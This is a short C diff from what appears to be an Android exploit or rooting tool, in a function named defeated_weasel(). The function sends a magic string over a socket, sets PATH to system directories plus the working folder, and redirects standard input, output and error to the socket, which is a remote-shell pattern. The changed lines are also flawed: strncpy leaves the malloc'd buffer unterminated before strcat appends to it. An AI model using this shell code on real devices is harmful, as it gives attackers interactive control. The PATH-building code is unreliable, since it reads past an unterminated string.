@@ -115,10 +115,12 @@ bool defeated_weasel()
     send(s, magic, strlen(magic), 0);
     
     /* Add current folder to PATH */
-    char *path = getenv("PATH");
-    strcat(path, ":");
-    strcat(path, dir);
-    setenv("PATH", path, 1);
+    char *standardPath = "/system/bin:/system/xbin";
+    char *newPath = malloc(strlen(standardPath) + 1 + strlen(dir) + 1);
+    strncpy(newPath, standardPath, strlen(standardPath));
+    strcat(newPath, ":");
+    strcat(newPath, dir);
+    setenv("PATH", newPath, 1);
 
     /* Connect stdin, stdout and stderr to socket */
     dup2(s, STDIN_FILENO);
